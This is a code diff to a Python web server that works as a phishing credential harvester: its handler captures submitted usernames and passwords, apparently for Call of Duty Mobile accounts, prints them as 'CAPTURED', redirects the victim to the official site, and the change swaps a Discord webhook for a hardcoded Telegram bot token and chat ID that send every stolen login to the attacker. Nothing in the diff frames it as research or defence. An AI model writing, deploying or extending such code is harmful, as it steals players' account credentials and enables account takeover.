@@ -5,10 +5,28 @@ import urllib.parse
 import datetime
 import os
 import urllib.request
-import json
 
 PORT = int(os.environ.get("PORT", 8000))
-DISCORD_WEBHOOK_URL = ""  # Optional: paste your Discord webhook URL here
+
+# --- TELEGRAM CONFIG ---
+TELEGRAM_BOT_TOKEN = "8806187111:AAH2xPa8L6NLIG07ecojvIGzYDaqCFNMrPA"   # Paste your Bot Token here
+TELEGRAM_CHAT_ID = "7174097631"     # Paste your Chat ID here
+
+def send_telegram(message):
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = urllib.parse.urlencode({
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": message,
+            "parse_mode": "Markdown"
+        }).encode('utf-8')
+        
+        req = urllib.request.Request(url, data=payload)
+        urllib.request.urlopen(req)
+    except Exception as e:
+        print(f"Telegram Error: {e}", flush=True)
 
 class CredentialHandler(http.server.SimpleHTTPRequestHandler):
     def do_POST(self):
@@ -29,14 +47,9 @@ class CredentialHandler(http.server.SimpleHTTPRequestHandler):
         # Print to Render Logs
         print(f"\n========== CAPTURED ==========\n{log_entry}============================\n", flush=True)
         
-        # Optional: Send to Discord
-        if DISCORD_WEBHOOK_URL:
-            try:
-                payload = json.dumps({"content": f"🎯 **New CODM Capture**\nTime: {timestamp}\nUser: `{username}`\nPass: `{password}`"}).encode('utf-8')
-                req = urllib.request.Request(DISCORD_WEBHOOK_URL, data=payload, headers={"Content-Type": "application/json"})
-                urllib.request.urlopen(req)
-            except Exception as e:
-                print(f"Discord Error: {e}", flush=True)
+        # Send to Telegram
+        telegram_msg = f"🎯 *New CODM Capture*\nTime: {timestamp}\nUser: `{username}`\nPass: `{password}`"
+        send_telegram(telegram_msg)
         
         # Redirect to official site
         self.send_response(302)
@@ -49,4 +62,3 @@ class CredentialHandler(http.server.SimpleHTTPRequestHandler):
 with socketserver.TCPServer(("0.0.0.0", PORT), CredentialHandler) as httpd:
     print(f"Server running on port {PORT}")
     httpd.serve_forever()
-
